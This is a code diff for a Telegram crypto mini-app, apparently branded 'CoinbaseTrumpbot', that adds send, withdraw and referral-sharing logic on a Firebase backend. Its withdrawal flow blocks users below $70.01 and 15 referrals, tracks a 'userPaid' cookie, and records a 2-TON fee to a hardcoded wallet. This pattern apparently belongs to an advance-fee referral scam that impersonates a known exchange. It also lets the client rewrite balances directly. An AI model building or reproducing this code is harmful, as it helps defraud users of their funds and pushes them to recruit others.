+              [`users/${userId}/transactions/${senderTxRef.key}`]: {
+                amount,
+                wallet: recipientWallet,
+                type: "Send",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
+                amount,
+                wallet: userWalletAddress,
+                type: "Receive",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${recipientId}/notifications/${Date.now()}`]: {
+                title: "Funds Received",
+                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
+                timestamp: new Date().toISOString(),
+              },
+            };
+
+            update(ref(database), updates).then(() => {
+              iziToast.success({ title: "Success", message: `Sent $${amount.toFixed(2)} to ${recipientWallet}!`, position: "topRight" });
+              $("#darkModal1").iziModal("close");
+              $("#send-form")[0].reset();
+            }).catch((error) => {
+              iziToast.error({ title: "Error", message: "Failed to send funds: " + error.message, position: "topRight" });
+            }).finally(() => {
+              submitButton.prop("disabled", false).removeClass("loading").val("Send");
+              $("#insufficient-send-balance").addClass("hide");
+            });
+          });
+        });
+      });
+
+      // Withdraw logic
+      $(".open-withdraw").on("click", function() {
+        get(userRef).then((snapshot) => {
+          const userData = snapshot.val() || {};
+          const userBalance = userData.balance || 0;
+          const referrals = userData.referrals || 0;
+          const userWithdrawalCookie = document.cookie.split("; ").find((row) => row.startsWith("userWithdrawal="));
+          const userWithdrawal = userWithdrawalCookie ? userWithdrawalCookie.split("=")[1] : null;
+          const userPaidCookie = document.cookie.split("; ").find((row) => row.startsWith("userPaid="));
+          const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
+
+          if (userBalance < 70.01 || referrals < 15) {
+            $("#withdraw-message").text(`You need a minimum balance of $70.01 and 15 referrals to withdraw. Current balance: $${userBalance.toFixed(2)}, referrals: ${referrals}.`);
+            $("#eligibility-message").text(`[You are not eligible: 2137.]`);
+            $("#darkModal2").iziModal("open");
+          } else if (userWithdrawal === "pending" && userPaid !== "paid") {
+            $("#darkModal8").iziModal("open");
+            $("#continuePaymentText").html("Continue »");
+          } else if (userWithdrawal === "pending" && userPaid === "paid") {
+            $("#darkModal7").iziModal("open");
+          } else {
+            $("#darkModal8").iziModal("open");
+            $("#continuePaymentText").html("Continue »");
+          }
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to check eligibility: " + error.message, position: "topRight" });
+        });
+      });
+
+      $("#continuePayment").on("click", function() {
+        const userPaidCookie = document.cookie.split("; ").find((row) => row.startsWith("userPaid="));
+        const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;
+        if (userPaid !== "paid") {
           document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
-          iziToast.success({
-            title: "Success",
-            message: "Withdrawal request submitted successfully!",
-            position: "topRight",
-          });
-          $("#darkModal7").iziModal("close");
-          $("#darkModal8").iziModal("open");
-        })
-        .catch((error) => {
-          console.error("Balance Update Error:", error);
-          iziToast.error({
-            title: "Error",
-            message: "Failed to update balance. Please try again!",
-            position: "topRight",
+          $("#darkModal8").iziModal("close");
+          $("#darkModal9").iziModal("open");
+        } else {
+          $("#darkModal8").iziModal("close");
+          $("#darkModal7").iziModal("open");
+        }
+      });
+
+      $("#continuePaymentCls").on("click", function() {
+        $("#darkModal9").iziModal("close");
+      });
+
+      $("#wallet-form").on("submit", function(e) {
+        e.preventDefault();
+        const submitButton = $("#submitWalletInfo");
+        submitButton
+          .prop("disabled", true)
+          .addClass("loading")
+          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Processing...');
+
+        const recipientWallet = $("#walletInput").val().trim();
+        const amount = parseFloat($("#wallet_amountInput").val().trim());
+        const walletRegex = /^0x[a-fA-F0-9]{40}$|^UQC[a-zA-Z0-9_-]{42}$/;
+        const feeWallet = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
+        const feeAmount = 2; // 2 TONS
+
+        if (!recipientWallet || !walletRegex.test(recipientWallet)) {
+          iziToast.error({ title: "Error", message: "Invalid recipient wallet address!", position: "topRight" });
+          submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+          return;
+        }
+        if (isNaN(amount) || amount <= 0) {
+          iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
+          submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+          return;
+        }
+
+        get(ref(database, `users`)).then((usersSnapshot) => {
+          const users = usersSnapshot.val();
+          let recipientId = null;
+          for (const uid in users) {
+            if (users[uid].wallet === recipientWallet) {
+              recipientId = uid;
+              break;
+            }
+          }
+          if (!recipientId) {
+            iziToast.error({ title: "Error", message: "Recipient wallet not found in the app!", position: "topRight" });
+            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+            return;
+          }
+
+          get(ref(database, `users/${userId}/balance`)).then((snapshot) => {
+            const currentBalance = snapshot.val() || 0;
+            if (amount + feeAmount > currentBalance) {
+              $("#insufficient-balance").removeClass("hide");
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              return;
+            }
+
+            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
+            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
+            const feeTxRef = push(ref(database, `users/${userId}/transactions`));
+            const updates = {
+              [`users/${userId}/balance`]: currentBalance - amount - feeAmount,
+              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
+              [`users/${userId}/transactions/${senderTxRef.key}`]: {
+                amount,
+                wallet: recipientWallet,
+                type: "Withdraw",
+                status: "pending",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
+                amount,
+                wallet: userWalletAddress,
+                type: "Receive",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${userId}/transactions/${feeTxRef.key}`]: {
+                amount: feeAmount,
+                wallet: feeWallet,
+                type: "Fee",
+                status: "completed",
+                timestamp: new Date().toISOString(),
+              },
+              [`users/${recipientId}/notifications/${Date.now()}`]: {
+                title: "Funds Received",
+                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
+                timestamp: new Date().toISOString(),
+              },
+            };
+
+            update(ref(database), updates).then(() => {
+              document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+              document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+              iziToast.success({ title: "Success", message: `Withdrawal of $${amount.toFixed(2)} requested to ${recipientWallet}!`, position: "topRight" });
+              $("#darkModal7").iziModal("close");
+              $("#darkModal9").iziModal("open");
+            }).catch((error) => {
+              iziToast.error({ title: "Error", message: "Failed to process withdrawal: " + error.message, position: "topRight" });
+            }).finally(() => {
+              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
+              $("#insufficient-balance").addClass("hide");
+            });
           });
         });
-    })
-    .catch((error) => {
-      console.error("Withdrawal Error:", error);
-      iziToast.error({
-        title: "Error",
-        message: "Failed to submit withdrawal request. Please try again!",
-        position: "topRight",
+      });
+
+      // Share button functionality
+      const shareButton = document.getElementById("share-button");
+      const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
+      shareButton.addEventListener("click", function() {
+        copyToClipboard(referralLink).then(() => {
+          $("#darkModal5").iziModal("open");
+          showToast("Referral link copied to clipboard!");
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to copy referral link: " + error.message, position: "topRight" });
+        });
+      });
+
+      // Logout functionality
+      $("#logout-btn").on("click", function() {
+        window.Telegram.WebApp.close();
       });
     });
-}
-
-    // Share button functionality
-    const shareButton = document.getElementById("share-button");
-    const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
-
-    shareButton.addEventListener("click", () => {
-      const tempInput = document.createElement("input");
-      tempInput.value = referralLink;
-      tempInput.style.position = "absolute";
-      tempInput.style.left = "-9999px";
-      document.body.appendChild(tempInput);
-      tempInput.select();
-      document.execCommand("copy");
-      document.body.removeChild(tempInput);
-
-      iziToast.success({
-        title: "Copied!",
-        message: "Referral link copied to clipboard!",
-        duration: 3000,
-        position: "topRight",
-      });
-    });
-  });
-</script>
-
-<br>
-
+  </script>
 </body>
 </html>
